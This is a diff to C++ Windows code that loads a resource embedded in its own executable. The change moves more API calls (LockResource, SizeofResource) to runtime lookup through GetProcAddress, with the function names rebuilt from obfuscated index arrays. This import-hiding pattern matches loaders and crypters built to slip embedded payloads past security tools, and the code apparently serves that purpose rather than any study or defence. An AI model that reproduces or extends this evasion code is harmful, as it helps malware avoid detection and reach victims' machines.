@@ -26,17 +26,20 @@ void loadkumres(const char* rssssame, char** data, DWORD* size) {
     int siz_res[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
     HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
     //auto pGetModuleHandle = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_han, big_string, sizeof(get_mod_han)).c_str());
-    //auto pFindResource = (HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
+    //FARPROC pFindResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
     FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
-    //auto pLockResource = (char*(WINAPI*)(HGLOBAL))GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
-    FARPROC Size_Of_Resource_Func = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
+    FARPROC pLockResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
+    FARPROC psize_res = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
+    
+    auto Size_Of_Resource_Func = (DWORD(WINAPI*)(HMODULE, HRSRC))psize_res;
+    //auto fin_res_A=(HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource;
     
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
 
     HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
     *size = Size_Of_Resource_Func(hModule, hResource);
-    *data = (char*)LockResource(hResData);
+    *data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
 
 
     //HMODULE hModule = GetModuleHandle(NULL);
